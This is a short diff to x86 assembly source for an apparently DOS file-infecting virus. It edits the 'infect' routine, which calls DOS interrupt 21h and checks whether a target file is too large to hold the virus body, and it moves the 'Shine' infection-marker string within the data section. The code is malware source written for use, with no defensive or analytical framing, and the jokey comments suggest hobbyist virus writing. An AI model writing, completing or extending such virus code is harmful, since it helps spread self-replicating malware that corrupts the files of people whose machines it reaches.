@@ -99,7 +99,10 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      xor dx, dx       ; DX = 0
      int 21h          ; Calling int 21h
      cmp ax, 65436-virus_size   ; I the file too big??
+     pop bx
      je .abort_infection
+     push bx
+                      ; Nope, perfetto sizo
      
 
 .abort_infection:
@@ -107,8 +110,8 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
         
 data_section:
      .save_bp dw 0
-     .file_infected db 'Shine'
      .MZ_BUF dw 0
+     .file_infected db 'Shine'
 
 virus_size equ endinging-beninging
 endinging:
